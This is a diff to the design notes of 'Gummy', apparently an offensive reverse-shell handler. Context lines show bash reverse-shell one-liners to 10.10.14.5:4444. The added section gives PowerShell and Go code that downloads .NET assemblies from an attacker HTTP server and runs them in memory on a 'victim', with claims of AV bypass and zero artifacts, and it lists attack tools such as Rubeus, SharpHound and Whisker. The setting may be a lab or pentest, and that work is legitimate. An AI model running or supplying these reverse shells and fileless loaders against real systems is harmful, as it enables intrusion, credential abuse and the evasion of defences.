@@ -202,9 +202,19 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Known limitation: Prompt may briefly disappear when navigating history
 
 ### 📋 TODO (Phase 5 - Module Optimization & Polish) - See TODO.md for details
+
+**Next Up: Module Optimization**
 - [ ] **Optimize run modules with binbag** - Use HTTP for faster module downloads
 - [ ] **Module chunking support** - Fallback to b64 chunks when binbag disabled
-- [ ] **In-memory vs disk modes** - Respect execution mode config (stealth/speed)
+- [ ] **Simplify execution modes** - Binbag solves speed issue, may not need stealth/speed toggle
+- [ ] **Add `run bin` module** - Generic disk+cleanup for any binary/executable
+- [ ] **Implement .NET in-memory execution** - Load assemblies via `[Reflection.Assembly]::Load($bytes)`
+  - Zero disk artifacts for .NET tools (SharpUp, Rubeus, Seatbelt, etc.)
+  - Download via HTTP, load bytes directly into memory
+  - Execute with `$assembly.EntryPoint.Invoke($null, @(,$args))`
+  - See: .NET In-Memory Execution section below
+
+**Polish & Testing**
 - [ ] **Fix Windows whoami detection** - Currently shows "unknown", should extract from command output
 - [ ] **Test Windows in-memory modules** - `run ps1`, `run net`, `run py` need testing
 - [ ] **SIGWINCH handler** - Dynamic terminal resize (currently fixed at connection time)
@@ -682,6 +692,123 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 ### PTY Handling
 - https://github.com/creack/pty
 - https://blog.kowalczyk.info/article/zy/creating-pseudo-terminal-pty-in-go.html
+
+## .NET In-Memory Execution (PowerShell)
+
+### Overview
+Execute .NET assemblies **completely in-memory** without touching disk - perfect for bypassing AV and leaving zero artifacts.
+
+### How It Works
+```powershell
+# 1. Download assembly as byte array (not string!)
+$bytes = (New-Object Net.WebClient).DownloadData("http://10.10.14.5:8080/SharpUp.exe")
+
+# 2. Load assembly directly into memory
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+# 3. Execute the EntryPoint (Main method)
+$assembly.EntryPoint.Invoke($null, @(,$args))
+```
+
+### Complete Example with Arguments
+```powershell
+# Download SharpUp from binbag
+$url = "http://10.10.14.5:8080/SharpUp.exe"
+$bytes = (New-Object Net.WebClient).DownloadData($url)
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+# Run with arguments (e.g., "audit")
+$args = @("audit")
+$assembly.EntryPoint.Invoke($null, @(,$args))
+```
+
+### Implementation in Gummy
+```go
+// internal/session.go - RunDotNetInMemory()
+func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource string, args []string) error {
+    // 1. Resolve source (binbag file, URL, or local path)
+    localPath, cleanup, err := resolveSource(assemblySource)
+    if cleanup != nil {
+        defer cleanup()
+    }
+
+    // 2. Get HTTP URL from binbag
+    httpURL := GlobalRuntimeConfig.GetHTTPURL(filepath.Base(localPath))
+
+    // 3. Build PowerShell command for in-memory execution
+    argsStr := ""
+    if len(args) > 0 {
+        argsStr = `@("` + strings.Join(args, `","`) + `")`
+    } else {
+        argsStr = "@()"
+    }
+
+    cmd := fmt.Sprintf(`
+$bytes = (New-Object Net.WebClient).DownloadData('%s')
+$assembly = [Reflection.Assembly]::Load($bytes)
+$assembly.EntryPoint.Invoke($null, @(,%s))
+`, httpURL, argsStr)
+
+    // 4. Execute and stream output to terminal
+    return s.Handler.ExecuteWithStreaming(cmd, outputPath)
+}
+```
+
+### Usage in Gummy
+```bash
+# 1. Enable binbag
+󰗣 gummy ❯ set binbag ~/Lab/binbag
+
+# 2. Add SharpUp.exe to binbag directory
+cp SharpUp.exe ~/Lab/binbag/
+
+# 3. Run in-memory (current `run net` module)
+󰗣 gummy [1] ❯ run net SharpUp.exe audit
+
+# Output streams to new terminal window
+# Zero disk artifacts on victim!
+```
+
+### Advantages
+- ✅ **Zero disk artifacts** - Assembly never written to disk on victim
+- ✅ **AV bypass** - Most AVs can't scan in-memory .NET assemblies
+- ✅ **Blazing fast** - HTTP download from binbag (~1 second)
+- ✅ **Works with any .NET assembly** - SharpUp, Rubeus, Seatbelt, Certify, etc.
+- ✅ **Clean execution** - No cleanup needed (nothing to clean!)
+
+### Limitations
+- ❌ **Only .NET assemblies** - Won't work with native binaries (mimikatz.exe, pspy64)
+- ❌ **Requires EntryPoint** - Assembly must have a `Main()` method
+- ❌ **Some assemblies detect in-memory execution** - May refuse to run or behave differently
+- ❌ **Windows only** - Requires PowerShell/.NET Framework
+
+### Tools That Work Great
+- **SharpUp** - Windows privilege escalation checker
+- **Rubeus** - Kerberos abuse toolkit
+- **Seatbelt** - System enumeration
+- **Certify** - Active Directory certificate abuse
+- **SharpHound** - BloodHound data collector
+- **SharpDPAPI** - DPAPI abuse
+- **Whisker** - Shadow credentials manipulation
+
+### For Native Binaries (Non-.NET)
+Use `run bin` module (disk + cleanup):
+```bash
+# Run native binary (writes to disk temporarily)
+󰗣 gummy [1] ❯ run bin pspy64
+
+# Execution:
+# 1. Download from binbag via HTTP
+# 2. Write to /tmp/gummy_pspy64
+# 3. chmod +x
+# 4. Execute
+# 5. Shred file on completion
+```
+
+### Module Execution Modes Summary
+- **💾 In-Memory** (`run sh`, `run ps1`, `run net`) - Zero disk, max stealth
+- **🧹 Disk + Cleanup** (`run bin`, `run pspy`) - Temporary disk, auto-shred
+- **💿 Disk Only** (`run privesc`) - Intentional persistence for later use
 
 ## Questions to Consider
 
